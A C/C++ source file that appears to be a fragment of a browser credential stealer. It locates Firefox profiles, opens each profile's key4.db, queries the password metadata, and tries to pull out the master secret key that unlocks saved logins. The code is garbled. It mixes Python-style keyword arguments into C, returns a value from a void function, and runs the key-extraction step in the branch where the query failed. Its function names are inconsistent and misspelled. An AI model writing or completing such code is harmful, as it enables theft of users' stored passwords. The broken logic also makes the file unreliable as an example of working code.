#include "defs.h"
#include"firefox.h"
#include<stdio.h>

void get_key()
{
	char path[MAX_PATH];
	char appData[MAX_PATH], profile[MAX_PATH];
	char sections[4096];

	LSTATUS check4 = SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, (appData));
	
	_snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\profiles.ini", appData);
	DWORD PriPro = GetPrivateProfileSectionNamesA(sections, 4096, path);
	if (PriPro == 4094)
	{
		printf("Check Drypt private profile section\n");
	}
	char* p = sections;
	while (1)
	{
		if (_strnicmp(p, "Profile", 7) == 0)
		{
			DWORD PriStr = GetPrivateProfileStringA(p, "Path", NULL, profile, MAX_PATH, path);
			_snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\Profiles\\%s", appData, std::string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str());
			if (!(*fpNSS_INIT)(path))
			{
				char* database = dupcat(path, (char*)"\\key4.db", 0);
				int entries = 0;
				sqlite3* db;
				char* row = { 0 };
				if (isqlite3_open(database, &db) == SQLITE_OK)
				{
					sqlite3_stmt* stmt;
					const char* query = "SELECT item1,item2 FROM metadata WHERE id = 'password';";
					if (isqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK)
					{
						isqlite3_step(stmt) == SQLITE_ROW;
					}
					else
					{
						if (isqlite3_step(stmt) == SQLITE_ROW)
						{
							manage_masterpasssword(master_password = '', key_data = key_data, new_version = FALSE);
							if (global_salt)
							{
								char* key = extract_secret_key(key_data = key_data, global_salt = global_salt, master_password = master_password, entry_salt = entry_salt);
								if (key)
								{
									debug(key);
									return key;
								}
							}

						}
					}
					}

				}
			}
		
		}
	}

manage_masterpassword(master_password = '', key_data = NULL, new_version = True)
{
	is_master_password_correct(master_password = master_password, key_data = key_data, new_version = ver_version)

	
}


is_master_correct(key_data = key_data, master_password = '', new_version = TRUE)
{
	if (new_version)
	{
		global_salt = keydata[0];
		item2 = key_data[1];
		
	}
}

	